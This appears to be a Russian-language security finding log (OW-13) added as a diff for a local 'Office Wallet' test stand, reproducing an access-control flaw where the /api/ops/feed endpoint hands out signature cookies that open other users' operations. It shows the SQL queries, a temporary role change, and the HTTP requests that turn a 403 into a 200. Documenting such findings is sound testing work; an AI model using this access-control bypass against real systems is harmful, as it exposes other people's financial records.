@@ -1,0 +1,39 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-13
+################################################################################################
+== 6. OW-13: чужие операции через токены /api/ops/feed ==
+    · /api/ops/feed выдаёт подписи (op_grant) на 30 последних операций всех
+    · пользователей и рассовывает их в cookie (handlers_money.go:97-127). А проверка
+    · на /operations/N сверяет подпись только с uid того, кто смотрит (строки 78-89)
+    · — то есть feed сам раздаёт валидные ключи от чужих операций.
+    → SQL SELECT id FROM operations WHERE id >= (SELECT COALESCE(MAX(id)-29,0) FROM operations) AND COALESCE(from_user_id,0)<>1 AND COALESCE(to_user_id,0)<>1 ORDER BY id DESC LIMIT 1
+    ← psql 585
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    · у иванова роль admin (наши тесты переписали данные стенда) — админу и так
+    · всё можно, проверка подписей его не касается; снимем роль, чтобы показать
+    · проверку на себе. Важно: роль в куке перетирает роль из базы (auth.go:40-42),
+    · поэтому после правки перелогиниваемся, чтобы кука тоже стала employee:
+    → SQL UPDATE users SET role='employee' WHERE login='ivanov'
+    ← psql UPDATE 1
+    ← роль ivanov в базе: employee
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ← кука пересобрана: role=employee
+    чужая операция #585 (не ivanov), она в последних 30 — feed её выдаёт
+    → GET /operations/585  (без подписи — контроль)
+    ← HTTP 403 forbidden 
+    → GET /api/ops/feed  (подписи на 30 последних операций всех юзеров)
+    ← HTTP 200 [{"id":590,"kind":"purchase","status":"ok","t":"f192aae4418eb0916dce40068f14d2a2"},{"id":589,"kind":"topup","status":"ok","t":"d9b4d96496e2a851ffef89a8c513600e"},{"id":588,"kind":"purchase","status":"ok","t":"ea657437ffbb3b4df30cc331072e5de...
+    → GET /operations/585  (с кукой op_grant_585 из feed)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Операция · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ┌─ АРТЕФАКТ · OW-13 · feed выдаёт grant на чужую операцию
+    │ чужая операция #585; без grant: HTTP 403
+    │ GET /api/ops/feed → HTTP 200; cookies содержит op_grant_585
+    │ с grant: HTTP 200, карточка открыта; memo=Отмена заказа #204
+    └─
+[+] 403 → 200: подписью из feed открыта чужая операция: Отмена заказа #204
+    → SQL UPDATE users SET role='admin' WHERE login='ivanov'
+    ← psql UPDATE 1
+    роль ivanov возвращена: admin
